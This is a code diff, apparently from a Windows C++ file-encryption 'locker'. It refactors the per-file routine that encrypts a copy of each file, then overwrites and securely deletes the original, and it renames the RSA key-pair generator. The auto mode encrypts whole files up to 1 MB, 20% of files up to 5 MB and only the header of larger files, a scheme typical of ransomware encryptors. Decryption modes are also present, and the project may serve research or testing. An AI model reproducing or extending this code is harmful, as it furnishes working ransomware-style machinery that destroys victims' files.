@@ -2,6 +2,7 @@
 #include "filesystem.h"
 #include "global_parameters.h"
 #include "memory.h"
+#include "logs.h"
 
 #include <stdio.h>
 #include <cstdint>
@@ -129,7 +130,6 @@ CRYPT_INFO* locker::GeneratePolicy(CRYPTO_SYSTEM* sys)
 		
 	if (CryptInfo->method_policy == AES256 || CryptInfo->method_policy == RSA_AES256)
 	{
-
 		EncryptCipher state_crypt = global::GetDeCrypt();
 		EncryptModes state_mode = global::GetEncMode();
 
@@ -148,23 +148,44 @@ CRYPT_INFO* locker::GeneratePolicy(CRYPTO_SYSTEM* sys)
 				CryptInfo->mode = MODE_AES::AES_DECRYPT_NO_PADDING;
 		}
 	}
-
 	if (CryptInfo->gen_policy == GENKEY_ONCE)
 		CryptInfo->gen_key_method(CryptInfo->ctx, global::GetKey(), global::GetIV());
-	
 	return CryptInfo;
 }
 
 
-STATIC BOOL SecureDelete(WCHAR* Path)
-{
-	HANDLE Handle = CreateFileW(Path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+STATIC BOOL SecureDelete(CONST WCHAR* FilePath)
+{	
+	HANDLE Handle = CreateFileW(FilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 	if (Handle == INVALID_HANDLE_VALUE)
+		return FALSE;	
+
+	if(SetFilePointer(Handle, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER
+		|| !SetEndOfFile(Handle))
 		return FALSE;
-	SetFilePointer(Handle, 0, NULL, FILE_BEGIN);
-	SetEndOfFile(Handle);
 	CloseHandle(Handle);
-	DeleteFileW(Path);
+	return DeleteFileW(FilePath);
+}
+
+
+STATIC BOOL SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
+{
+	FileInfo->Filename = data->Filename;
+	FileInfo->newFilename = filesystem::MakeCopyFile(data->Path, data->Filename, data->Exst, data->FullPath);
+	FileInfo->CryptInfo = CryptInfo;
+	FileInfo->FilePath = data->FullPath;
+
+	if (!filesystem::getParseFile(FileInfo) && FileInfo->FileHandle != INVALID_HANDLE_VALUE)
+	{
+		LOG_ERROR(L"Failed ParseFile %ls. GetLastError = %lu", data->Filename, GetLastError());
+		return FALSE;
+	}
+	if (!filesystem::CreateFileOpen(FileInfo) && FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
+	{
+		LOG_ERROR(L"Failed CreateFileOpen %ls GetLastError = %lu", data->Filename, GetLastError());
+		return FALSE;
+	}
+
 	return TRUE;
 }
 
@@ -174,185 +195,105 @@ BOOL locker::HandlerCrypt
 	PDRIVE_INFO data,
 	SLIST<HLIST>* HashList
 )
-{	
-	BOOL success = TRUE;
+{		
+	BOOL success = FALSE;
+	EncryptCipher stateCipher = global::GetEncrypt();	
+	FILE_INFO FileInfo;	
+	EncryptModes mode = global::GetEncMode();
+	if (!SetOptionFileInfo(&FileInfo, data, CryptInfo))
+		goto END;
+
 	if (HashList != NULL && global::GetDeCrypt() == EncryptCipher::CRYPT)
-	{		
-		if (!filesystem::HashSignatureFile(HashList, data->FullPath, data->Filename))
-			printf_s("Failed HashSignatureFile\n");
+	{
+		if (!filesystem::HashSignatureFile(HashList, &FileInfo))
+			LOG_ERROR(L"Failed HashSignatureFile, filename -  %ls", data->Filename);
 	}
 
-	WCHAR* newFilename = filesystem::MakeCopyFile(data->Path, data->Filename, data->Exst, data->FullPath);
 	
-	if (global::GetEncrypt() == EncryptCipher::SYMMETRIC)
+	if (stateCipher == EncryptCipher::SYMMETRIC)
 	{
-		locker::FILE_INFO FileInfo;
-		FileInfo.CryptInfo = CryptInfo;		
-		FileInfo.FilePath = data->FullPath;
-		FileInfo.Filename = data->Filename;
-		FileInfo.newFilename = newFilename;
 		if(CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
 			CryptInfo->gen_key_method(CryptInfo->ctx, global::GetKey(), global::GetIV());
-		
-		if (filesystem::getParseFile(&FileInfo) && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
-		{			
-			if (!filesystem::CreateFileOpen(&FileInfo) && FileInfo.newFileHandle == INVALID_HANDLE_VALUE)
-			{
-				success = FALSE;
-				if (FileInfo.FileHandle && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
-					CloseHandle(FileInfo.FileHandle);
-				goto END;
-			}
 							
-			if (global::GetEncMode() == EncryptModes::AUTO_ENCRYPT)
-			{
-				if (FileInfo.Filesize <= 1048576)
-				{
-					if (!filesystem::EncryptFileFullData(&FileInfo))
-					{
-						printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", data->Filename, GetLastError());
-						success = FALSE;
-					}					
-				}
-				else if (FileInfo.Filesize <= 5242880)
-				{
-					if (!filesystem::EncryptFilePartly(&FileInfo, 20))
-					{
-						printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", data->Filename, GetLastError());
-						success = FALSE;
-					}					
-				}
-				else
-				{
-					if (!filesystem::EncryptFileHeader(&FileInfo))
-					{
-						printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", data->Filename, GetLastError());
-						success = FALSE;
-					}
-				}
-			}
-			else if (global::GetEncMode() == EncryptModes::FULL_ENCRYPT)
-			{
-				if (!filesystem::EncryptFileFullData(&FileInfo))
-				{
-					printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", data->Filename, GetLastError());
-					success = FALSE;					
-				}				
-			}
-			else if (global::GetEncMode() == EncryptModes::PARTLY_ENCRYPT)
-			{				
-				if (!filesystem::EncryptFilePartly(&FileInfo, 20))
-				{
-					printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", data->Filename, GetLastError());
-					success = FALSE;
-				}
-			}
-			else if (global::GetEncMode() == EncryptModes::HEADER_ENCRYPT)
-			{
-				if (!filesystem::EncryptFileHeader(&FileInfo))
-				{
-					printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", data->Filename, GetLastError());
-					success = FALSE;
-				}
-			}
-			else if (global::GetEncMode() == EncryptModes::BLOCK_ENCRYPT)
-			{
-				if (!filesystem::EncryptFileBlock(&FileInfo))
-				{
-					printf_s("Failed %ls to EncryptFileBlock. GetLastError = %lu.\n", data->Filename, GetLastError());
-					success = FALSE;
-				}
-			}
-			else if (global::GetStatus())
-			{
-				filesystem::ReadFile_(&FileInfo);
-			}
-		}
-		else
-		{
-			printf_s("Failed ParseFile %ls. GetLastError = %lu. \n", data->Filename, GetLastError());
-			success = FALSE;
-		}
-		if (FileInfo.FileHandle && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
-			CloseHandle(FileInfo.FileHandle);
-		if (FileInfo.newFileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
-			CloseHandle(FileInfo.newFileHandle);
-		RtlSecureZeroMemory(&FileInfo, sizeof(FileInfo));		
-		if (!success)
-			goto END;		
+		if (!filesystem::OptionEncryptMode(&FileInfo, mode))
+			goto END;
 	}
-	else if (global::GetEncrypt() == EncryptCipher::ASYMMETRIC)
+	else if (stateCipher == EncryptCipher::ASYMMETRIC)
 	{
 		if (global::GetDeCrypt() == EncryptCipher::CRYPT)
-		{			
-			if (!filesystem::FileCryptEncrypt(CryptInfo, global::GetPathRSAKey(), data->FullPath, newFilename))
+		{	
+			if (!filesystem::FileCryptEncrypt(&FileInfo, global::GetPathRSAKey()))
 			{
-				printf_s("Failed CryptEncrypt\n");
-				success = FALSE;
+				LOG_ERROR(L"Failed CryptEncrypt. filename - %ls", data->Filename);				
 				goto END;
 			}
 		}
 		else if (global::GetDeCrypt() == EncryptCipher::DECRYPT)
 		{			
-			if (!filesystem::FileCryptDecrypt(CryptInfo, global::GetPathRSAKey(), data->FullPath, newFilename))
+			if (!filesystem::FileCryptDecrypt(&FileInfo, global::GetPathRSAKey()))
 			{
-				printf_s("Failed CryptDecrypt\n");
-				success = FALSE;
+				LOG_ERROR(L"Failed CryptDecrypt. filename - %ls", data->Filename);				
 				goto END;
 			}
 		}		
 	}
-	else if (global::GetEncrypt() == EncryptCipher::RSA_ONLY)
+	else if (stateCipher == EncryptCipher::RSA_ONLY)
 	{
-		if (!filesystem::EncryptRSA(global::GetPathRSAKey(), data->FullPath, newFilename))
+		if (!filesystem::EncryptRSA(&FileInfo, global::GetPathRSAKey()))
 		{
-			printf_s("Failed Encrypt/Decrypt ONLY RSA\n");
-			success = FALSE;
+			LOG_ERROR(L"Failed Encrypt/Decrypt ONLY RSA. filename - %ls", data->Filename);			
 			goto END;
 		}
 	}
 
 	if (HashList != NULL && global::GetDeCrypt() == EncryptCipher::DECRYPT)
 	{
-		if (!filesystem::HashSignatureFile(HashList, newFilename, data->Filename))
-			printf_s("Failed HashSignatureFile\n");
+		if (!filesystem::HashSignatureFile(HashList, &FileInfo))
+			LOG_ERROR(L"Failed HashSignatureFile. filename - %ls", data->Filename);
 	}
 
 	if (global::GetStatusOverWrite())
 	{
-		if (!filesystem::OverWriteFile(data->FullPath))
-			printf("Failed OverWriteFile.\n");
+		if (!filesystem::OverWriteFile(&FileInfo))
+			LOG_ERROR(L"Failed OverWriteFile. filename - %ls", data->Filename);
 	}
 
-	if (global::GetFlagDelete())
-	{		
-		if (!SecureDelete(data->FullPath))
-			printf("Failed Delete File. GetLastError = %lu\n", GetLastError());
-	}
+	LOG_SUCCESS(L"success encrypt file %ls", data->Filename);
 	
-	if (!success)
-		SecureDelete(newFilename);
+	success = TRUE;
 END:
-	memory::m_free(newFilename);
+	
+	if (FileInfo.FileHandle && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
+		CloseHandle(FileInfo.FileHandle);
+	if (FileInfo.newFileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
+		CloseHandle(FileInfo.newFileHandle);
+
+	if (!success)
+		SecureDelete(FileInfo.newFilename);
+	else if (global::GetFlagDelete())
+		if (!SecureDelete(FileInfo.FilePath))
+			LOG_ERROR(L"Failed Delete File - %ls; GetLastError = %lu", data->Filename, GetLastError());
+	memory::m_free(FileInfo.newFilename);
+	memory::memzero_explicit(&FileInfo, sizeof(FileInfo));
 	return TRUE;
 }
 
 
 
-BOOL locker::HandlerASymmetricGenKey()
+BOOL locker::HandlerGenKeyPairRSA()
 {
 	HCRYPTPROV CryptoProvider;
 	HCRYPTKEY RsaKey;
 
 	if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
 	{
-		printf_s("Failed create provider. GetLastError = %lu.\n", GetLastError());
+		LOG_ERROR(L"Failed create provider. GetLastError = %lu.\n", GetLastError());
 		return FALSE;
 	}
 
 	if (!CryptGenKey(CryptoProvider, AT_KEYEXCHANGE, global::GetBitKey() | CRYPT_EXPORTABLE, &RsaKey))
 	{
-		printf_s("Failed gen key. GetLastError = %lu.\n", GetLastError());
+		LOG_ERROR(L"Failed gen key. GetLastError = %lu.\n", GetLastError());
 		CryptReleaseContext(CryptoProvider, 0);
 		return FALSE;
 	}
@@ -362,7 +303,7 @@ BOOL locker::HandlerASymmetricGenKey()
 	BYTE PublicKey[4096];
 	if (!CryptExportKey(RsaKey, 0, PUBLICKEYBLOB, 0, NULL, &SizeKey))
 	{
-		printf("Failed to get public key length. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"Failed to get public key length. GetLastError = %lu\n", GetLastError());
 		CryptDestroyKey(RsaKey);
 		CryptReleaseContext(CryptoProvider, 0);
 		return FALSE;
@@ -370,7 +311,7 @@ BOOL locker::HandlerASymmetricGenKey()
 
 	if (!CryptExportKey(RsaKey, 0, PUBLICKEYBLOB, 0, PublicKey, &SizeKey))
 	{
-		printf_s("Failed export Key. GetLastError = %lu.\n", GetLastError());
+		LOG_ERROR(L"Failed export Key. GetLastError = %lu.\n", GetLastError());
 		CryptDestroyKey(RsaKey);
 		CryptReleaseContext(CryptoProvider, 0);
 		return FALSE;
@@ -389,7 +330,7 @@ BOOL locker::HandlerASymmetricGenKey()
 
 	if (!CryptExportKey(RsaKey, 0, PRIVATEKEYBLOB, 0, PrivateKey, &p_SizeKey))
 	{
-		printf("Failed to export private key. GetLastError = %lu\n", GetLastError());
+		LOG_ERROR(L"Failed to export private key. GetLastError = %lu\n", GetLastError());
 		CryptDestroyKey(RsaKey);
 		CryptReleaseContext(CryptoProvider, 0);
 		return FALSE;
@@ -398,14 +339,14 @@ BOOL locker::HandlerASymmetricGenKey()
 
 	if (!filesystem::DropRSAKey(global::GetPath(), PublicKey, PrivateKey, SizeKey, p_SizeKey))
 	{
-		printf("Failed to drop RSA key to path %ls. GetLastError = %lu\n", global::GetPath(), GetLastError());
+		LOG_ERROR(L"Failed to drop RSA key to path %ls. GetLastError = %lu\n", global::GetPath(), GetLastError());
 		CryptDestroyKey(RsaKey);
 		CryptReleaseContext(CryptoProvider, 0);
 		return FALSE;
 	}
 
-	printf("Public Key (%lu bytes) generated and saved in: %ls\n", SizeKey, global::GetPath());
-	printf("Private Key (%lu bytes) generated and saved in: %ls\n", p_SizeKey, global::GetPath());
+	LOG_SUCCESS(L"Public Key (%lu bytes) generated and saved in: %ls\n", SizeKey, global::GetPath());
+	LOG_SUCCESS(L"Private Key (%lu bytes) generated and saved in: %ls\n", p_SizeKey, global::GetPath());
 
 	if (global::GetPrintHex())
 	{
